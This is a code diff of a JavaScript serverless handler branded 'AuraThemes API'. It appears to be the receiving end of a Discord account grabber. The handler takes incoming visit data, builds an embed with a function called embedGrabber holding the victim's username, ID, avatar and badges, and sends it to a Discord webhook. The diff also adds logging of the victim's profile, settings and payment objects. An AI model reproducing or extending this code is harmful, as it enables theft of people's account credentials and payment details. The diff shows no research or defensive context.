@@ -32,17 +32,16 @@ export default async function handler(req, res) {
       info = null
     })
 
-    const embedBuilder = info?.id
-      ? embedGrabber(info, data)
-      : embedRaw(data);
-
-    await webhook.send({
-      embeds: [embedBuilder],
-      username: '@AuraThemes',
-      avatarURL: 'https://i.imgur.com/WkKXZSl.gif',
-    });
+    if (info?.id) {
+      await webhook.send({
+        embeds: [embedGrabber(info, data)],
+        username: '@AuraThemes',
+        avatarURL: 'https://i.imgur.com/WkKXZSl.gif',
+      });
+    }
 
     res.status(200).send(data);
+    console.log("New visit:", data)
 
   } catch (error) {
     console.error('Error:', error);
@@ -174,32 +173,18 @@ function getStatus(l) {
 
 function allBabges(f) {
   return (
-      (1 & f ? emojis.user.i[0] : "") +
-      (2 & f ? emojis.user.i[1] : "") +
-      (4 & f ? emojis.user.i[2] : "") +
-      (8 & f ? emojis.user.i[3] : "") +
-      (64 & f ? emojis.user.i[4] : "") +
-      (128 & f ? emojis.user.i[5] : "") +
-      (256 & f ? emojis.user.i[6] : "") +
-      (512 & f ? emojis.user.i[7] : "") +
-      (16384 & f ? emojis.user.i[8] : "") +
-      (4194304 & f ? emojis.user.i[9] : "") +
-      (131072 & f ? emojis.user.i[10] : "")
+    (1 & f ? emojis.user.i[0] : "") +
+    (2 & f ? emojis.user.i[1] : "") +
+    (4 & f ? emojis.user.i[2] : "") +
+    (8 & f ? emojis.user.i[3] : "") +
+    (64 & f ? emojis.user.i[4] : "") +
+    (128 & f ? emojis.user.i[5] : "") +
+    (256 & f ? emojis.user.i[6] : "") +
+    (512 & f ? emojis.user.i[7] : "") +
+    (16384 & f ? emojis.user.i[8] : "") +
+    (4194304 & f ? emojis.user.i[9] : "") +
+    (131072 & f ? emojis.user.i[10] : "")
   ) || ":x:";
-}
-
-function embedRaw(data) {
-
-  console.log(data)
-  
-  return new EmbedBuilder()
-    .setAuthor({ name: 'AuraThemes', iconURL: 'https://i.imgur.com/WkKXZSl.gif' })
-    .setThumbnail('https://i.imgur.com/WkKXZSl.gif')
-    .setColor("#c267ff")
-    .setTitle('AuraThemes Raw')
-    .addFields({ name: "New visit lmao", value: `\`\`\`${data}\`\`\`` })
-    .setFooter({ text: 'AuraThemes API', iconURL: 'https://i.imgur.com/WkKXZSl.gif' })
-    .setTimestamp();;
 }
 
 function embedGrabber(info, data) {
@@ -215,7 +200,7 @@ function embedGrabber(info, data) {
 
   const avatar = info.avatar ? getImage(`https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`) : 'https://i.imgur.com/WkKXZSl.gif';
 
-  console.log(settings)
+  console.log({...profile, ...settings, ...payment})
 
   return new EmbedBuilder()
     .setAuthor({ name: `${info.username}#${info.discriminator} | ${info.id}`, iconURL: avatar })
